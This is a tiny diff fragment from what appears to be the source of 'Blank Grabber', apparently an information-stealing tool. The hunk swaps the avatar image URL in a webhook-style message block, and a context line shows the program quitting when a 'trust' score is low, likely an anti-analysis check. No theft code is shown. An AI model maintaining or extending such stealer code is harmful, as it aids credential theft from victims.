@@ -411,7 +411,7 @@ class BlankGrabber:
     }
   ],
   "username": "Blank Grabber",
-  "avatar_url": "https://i.imgur.com/QZ0yBxB.png"
+  "avatar_url": "https://i.imgur.com/ZZZtlwB.png"
 }
         if self.trust < 3:
             fquit(True)
